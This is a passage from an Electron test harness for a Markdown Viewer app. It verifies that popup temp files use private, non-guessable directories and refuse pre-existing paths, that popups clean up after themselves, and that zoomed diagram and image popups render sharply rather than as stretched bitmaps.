    "SEC-20 the popup document is not at the old fixed, guessable temp path",
    !!pathA &&
      !/omnicore-temp-mermaid\.html$/.test(pathA) &&
      !sameDir(path.dirname(pathA), tmpRoot),
    JSON.stringify({ pathA, tmpRoot }),
  );
  // Two popups of the same kind used to share one filename, so the second
  // overwrote the first and whichever closed first deleted the other's
  // document. That is a plain bug as well as the security problem.
  check(
    "SEC-20 two popups of the same kind get separate private directories",
    !!pathA && !!pathB && !sameDir(path.dirname(pathA), path.dirname(pathB)),
    JSON.stringify({ dirA: pathA && path.dirname(pathA), dirB: pathB && path.dirname(pathB) }),
  );
  // A pre-existing path must be refused rather than written through, which is
  // what makes the symlink swap fail instead of succeeding quietly.
  const squatDir = fs.mkdtempSync(path.join(tmpRoot, "mdv-squat-"));
  const squatFile = path.join(squatDir, "taken.html");
  fs.writeFileSync(squatFile, "original", "utf8");
  let squatRefused = false;
  try {
    fs.writeFileSync(squatFile, "overwritten", { encoding: "utf8", flag: "wx" });
  } catch (e) {
    squatRefused = e && e.code === "EEXIST";
  }
  check(
    "SEC-20 the 'wx' flag the fix relies on really does refuse an existing path",
    squatRefused === true && fs.readFileSync(squatFile, "utf8") === "original",
    JSON.stringify({ squatRefused, content: fs.readFileSync(squatFile, "utf8") }),
  );
  fs.rmSync(squatDir, { recursive: true, force: true });

  // Closing one must not disturb the other, and must take its own directory
  // with it rather than leaking one per popup.
  const dirA = pathA && path.dirname(pathA);
  const dirB = pathB && path.dirname(pathB);
  if (mermaidA) mermaidA.close();
  await sleep(700);
  check(
    "SEC-20 closing one popup removes only its own document, not the other's",
    !!dirA && !!dirB && !fs.existsSync(dirA) && fs.existsSync(dirB),
    JSON.stringify({ aGone: !fs.existsSync(dirA), bStillThere: fs.existsSync(dirB) }),
  );
  if (mermaidB) mermaidB.close();
  await sleep(700);
  check(
    "SEC-20 the temp directory is cleaned up when the popup closes",
    !!dirB && !fs.existsSync(dirB),
    JSON.stringify({ dirB, stillThere: dirB && fs.existsSync(dirB) }),
  );

  // -------------------------------------------------------------------------
  // Pop-out render QUALITY (not security, but this is the popup harness and
  // these are popup-only surfaces).
  //
  // Upstream 03b5423 drops `will-change: transform` from the zoom viewport,
  // reporting that it makes the SVG rasterize once and then stretch as a
  // bitmap. Confirmed here by capturing the window at 600% zoom and looking at
  // the pixels: a crisp vector render is bimodal (near-black glyph, near-white
  // paper) while an upscaled bitmap ramps across many mid-tones.
  //
  // The measurement is on the RENDERED FRAME, not on the CSS property, and the
  // old value is re-applied in-place as the probe's own vacuity guard: if
  // forcing promotion does not move the metric, the metric is measuring
  // nothing and every assertion here is worthless.
  // -------------------------------------------------------------------------
  const SHARP_SVG =
    "<svg xmlns='http://www.w3.org/2000/svg' width='400' height='120' viewBox='0 0 400 120'>" +
    "<rect x='10' y='10' width='380' height='100' fill='#ffffff' stroke='#333333' stroke-width='2'/>" +
    "<text x='30' y='55' font-family='sans-serif' font-size='18' fill='#111111'>Sharpness probe WWWmmm</text>" +
    "<text x='30' y='88' font-family='sans-serif' font-size='12' fill='#111111'>small text 0123456789 ijl</text>" +
    "</svg>";

  // Fraction of pixels sitting between "clearly ink" and "clearly paper".
  // Sharp edges cross that band in ~1 pixel; a stretched bitmap smears it.
  //
  // Clearance between the controls overlay's right edge and the first sampled
  // column. The overlay has a soft shadow and rounded corners that bleed a few
  // device pixels past its bounding rect, so sampling flush against it would
  // count chrome as diagram. 24 device px covers the shadow at DPR 1-2.
  const OVERLAY_GUTTER_PX = 24;
  // The discrimination is statistical, so the sample has to be wide enough for
  // the ratio to mean anything. Derived, not guessed: the sampled band is
  // 0.47 * height tall (y0=0.08H, y1=0.55H), so at the smallest window this
  // suite opens (900 device px tall => ~423 rows) a 128-column sample yields
  // ~54000 pixels, comfortably above the >10000 floor the fraction needs to be
  // stable. If the overlay ever grows enough to squeeze the sample below this,
  // that is a named failure rather than a quietly meaningless number.
  const MIN_SAMPLING_WIDTH_PX = 128;
  async function softEdgeFraction(win) {
    // capturePage() intermittently rejects with UnknownVizError under load -
    // observed during a revert run, where it surfaced as the whole suite
    // throwing instead of the assertion under test failing. Retry rather than
    // let a compositor hiccup masquerade as a result.
    //
    // It can also return the PREVIOUS frame when the window is not the
    // foreground window, which is worse: two captures come back byte-identical
    // and an A/B reads as "no difference". Ask for a fresh frame explicitly and
    // let the caller verify liveness.
    let img = null;
    let lastErr = null;
    for (let attempt = 0; attempt < 4 && !img; attempt++) {
      try {
        if (!win.isDestroyed()) {
          win.showInactive();
          win.moveTop();
        }
        await win.webContents.executeJavaScript(
          "new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)))",
          true,
        );
        const candidate = await win.capturePage();
        if (candidate && candidate.getSize().width > 0) img = candidate;
      } catch (e) {
        lastErr = e;
      }
      if (!img) await sleep(500);
    }
    if (!img) {
      return {
        soft: 0,
        total: 0,
        fraction: 0,
        samplingWidth: 0,
        overlayFraction: 0,
        captureFailed: String(lastErr),
      };
    }
    // The sampling window used to start at a hard-coded 30% of the width, on the
    // assumption that the controls overlay ends before it. That assumption is
    // invisible in the numbers: if the overlay ever grew past it, its crisp
    // DOM-drawn text would be counted as "shipped" sharpness and could hide a
    // real bitmap-stretch regression. Derive it from the overlay instead.
    let overlayRight = 0;
    try {
      overlayRight = await win.webContents.executeJavaScript(
        `(() => {
           const dpr = window.devicePixelRatio || 1;
           let r = 0;
           document.querySelectorAll('.ui-overlay, .controls').forEach(el => {
             const b = el.getBoundingClientRect();
             if (b.width > 0 && b.height > 0) r = Math.max(r, b.right * dpr);
           });
           return r;
         })()`,
        true,
      );
    } catch {
      overlayRight = 0;
    }
    const { width, height } = img.getSize();
    const buf = img.toBitmap(); // BGRA
    // No upper clamp: clamping would silently sample contaminated pixels if the
    // overlay ever grew past it, which is the exact failure the derivation was
    // added to prevent. Because x0 is always >= overlayRight + gutter, overlay
    // pixels cannot enter the sample by construction - so what actually needs
    // defending is that ENOUGH pixels are left to measure, which is why
    // `samplingWidth` is returned and asserted rather than a ratio.
    const x0 = Math.max(
      Math.floor(width * 0.3),
      Math.ceil(overlayRight) + OVERLAY_GUTTER_PX,
    );
    const x1 = Math.floor(width * 0.95);
    const y0 = Math.floor(height * 0.08);
    const y1 = Math.floor(height * 0.55);
    let soft = 0;
    let total = 0;
    for (let y = y0; y < y1; y++) {
      for (let x = x0; x < x1; x++) {
        const i = (y * width + x) * 4;
        const lum = 0.114 * buf[i] + 0.587 * buf[i + 1] + 0.299 * buf[i + 2];
        total++;
        if (lum > 40 && lum < 215) soft++;
      }
    }
    return {
      soft,
      total,
      fraction: total ? soft / total : 0,
      samplingWidth: Math.max(0, x1 - x0),
      overlayFraction: width ? overlayRight / width : 0,
    };
  }

  async function measureViewport(popup, artifactName) {
    const ev = (c) => popup.webContents.executeJavaScript(c, true);
    await ev(
      "state.scale = 6; state.pointX = -300; state.pointY = -150; updateTransform(); null",
    );
    await sleep(1000);
    const shipped = await softEdgeFraction(popup);
    const shippedWillChange = await ev(
      "getComputedStyle(document.getElementById('viewport')).willChange",
    );
    // Capture here, not at the end: the promoted leg below deliberately puts
    // the window back into the BROKEN state, so an artifact taken afterwards
    // would show a blurry frame and read as a failure of the shipped code.
    const shot = await captureScreenshot(popup, artifactName);
    if (shot) console.log("zoom artifact (shipped state): " + shot);
    // Put the old value back and repeat the whole gesture. The order matters
    // and a first attempt at this got it wrong: promoting an ALREADY-zoomed
    // layer changes nothing, because it is already rasterized at that scale.
    // The defect only appears when the layer is promoted while small and the
    // zoom then stretches that raster - which is exactly what a user does.
    await ev("state.scale = 1; state.pointX = 0; state.pointY = 0; updateTransform(); null");
    await sleep(400);
    await ev(
      "document.getElementById('viewport').style.willChange = 'transform';" +
        " void document.getElementById('viewport').offsetHeight; null",
    );
    await sleep(600);
    await ev(
      "state.scale = 6; state.pointX = -300; state.pointY = -150; updateTransform(); null",
    );
    await sleep(1000);
    const promoted = await softEdgeFraction(popup);
    return { shipped, promoted, shippedWillChange };
  }

  await closeAll();
  const sharpMermaid = await openPopup("open-mermaid-popup", {
    svgContent: SHARP_SVG,
    isDarkMode: false,
  });
  check("sharpness: the mermaid pop-out opened", !!sharpMermaid, "no window");
  if (sharpMermaid) {
    const m = await measureViewport(sharpMermaid, "popup-mermaid-zoom-sharp");
    // The sampling window starts past the controls overlay, so overlay pixels
    // cannot enter the sample by construction. What that construction can still
    // do is squeeze the sample down to nothing - and a fraction computed over a
    // handful of columns is noise that would read as either verdict. Pin the
    // derived minimum rather than a ratio: this is the load-bearing guard, and
    // overlayFraction is reported alongside only as a diagnostic.
    check(
      "the sharpness sample is wide enough for the fraction to mean anything",
      m.shipped.samplingWidth >= MIN_SAMPLING_WIDTH_PX &&
        m.promoted.samplingWidth >= MIN_SAMPLING_WIDTH_PX,
      JSON.stringify({
        shipped: m.shipped.samplingWidth,
        promoted: m.promoted.samplingWidth,
        required: MIN_SAMPLING_WIDTH_PX,
        overlayFraction: m.shipped.overlayFraction,
      }),
    );
    check(
      "sharpness probe discriminates: promoting the mermaid viewport blurs it",
      m.promoted.fraction > m.shipped.fraction * 1.3 && m.shipped.total > 10000,
      JSON.stringify(m),
    );
    check(
      "the mermaid pop-out renders crisply at 600%, not as a stretched bitmap",
      m.shippedWillChange === "auto" &&
        m.shipped.fraction < m.promoted.fraction * 0.8,
      JSON.stringify(m),
    );
  }

  await closeAll();
  const sharpImage = await openPopup("open-image-popup", {
    src:
      "data:image/svg+xml;base64," +
      Buffer.from(SHARP_SVG, "utf8").toString("base64"),
    alt: "vector probe",
    isDarkMode: false,
  });
  check("sharpness: the image pop-out opened", !!sharpImage, "no window");
  if (sharpImage) {
    const m = await measureViewport(sharpImage, "popup-image-zoom-sharp");
    check(
      "sharpness probe discriminates: promoting the image viewport blurs it",
      m.promoted.fraction > m.shipped.fraction * 1.3 && m.shipped.total > 10000,
      JSON.stringify(m),
    );
    // Beyond upstream, which only touched the diagram viewports: the image
    // pop-out is not raster-only, so it needs the same treatment.
    check(
      "the image pop-out renders vector content crisply at 600%",
      m.shippedWillChange === "auto" &&
        m.shipped.fraction < m.promoted.fraction * 0.8,
      JSON.stringify(m),
    );
  }
  await closeAll();

  // Every popup this suite opened was watched for console errors and for
  // errors that only ever appear on screen. The count assertion is what keeps
  // it honest: if openPopup ever stops attaching a watcher, an empty hit list
  // would otherwise read as a clean run.
  const popupHits = [];
  const popupStalls = [];
  for (const [id, s] of popupSentinels) {
    const r = await s.stop();
    popupHits.push(...r.hits);
    for (const st of r.stalls) popupStalls.push({ popup: id, ...st });
  }
  check(
    "every popup was watched, and none rendered a visible error",
    popupSentinels.size > 0 && popupHits.length === 0,
    JSON.stringify({ watched: popupSentinels.size, hits: popupHits }),
  );
  // A sentinel that could not reach its window did not observe anything, so an
  // empty hit list from it means nothing. Reported separately from hits so the
  // two failure modes are never confused.
  check(
    "no popup sentinel stalled trying to reach its window",
    popupStalls.length === 0,
    JSON.stringify(popupStalls),
  );
}

app.whenReady().then(async () => {
  // If another copy of the app is already running, main.js's single-instance
  // lock quits this process during startup and the suite produces no output at
  // all - which looks exactly like a crash. Say so explicitly.
  if (!BrowserWindow.getAllWindows().length) {
    console.log(
      "FAIL  no window at ready - another instance is probably holding the " +
        "single-instance lock. Close any running Markdown Viewer / stray " +
        "electron.exe and re-run.",
    );
  }

  const watchdog = setTimeout(() => {
    const failed = results.filter((r) => !r.ok).length;
    console.log(
      "FAIL  harness timed out after 240s - a blocking dialog is most likely open",
    );
    const summary = `=== ${results.length - failed}/${results.length + 1} passed (TIMED OUT) ===`;
    console.log(summary);
    writeReport(summary);
    app.exit(1);
  }, 240000);

  try {
    await run();
  } catch (e) {
    check("harness completed without throwing", false, String(e && e.stack));
  }

  clearTimeout(watchdog);
  const passed = results.filter((r) => r.ok).length;
  const summary = `=== ${passed}/${results.length} passed ===`;
  console.log(summary);
  writeReport(summary);
  app.exit(passed === results.length ? 0 : 1);
});
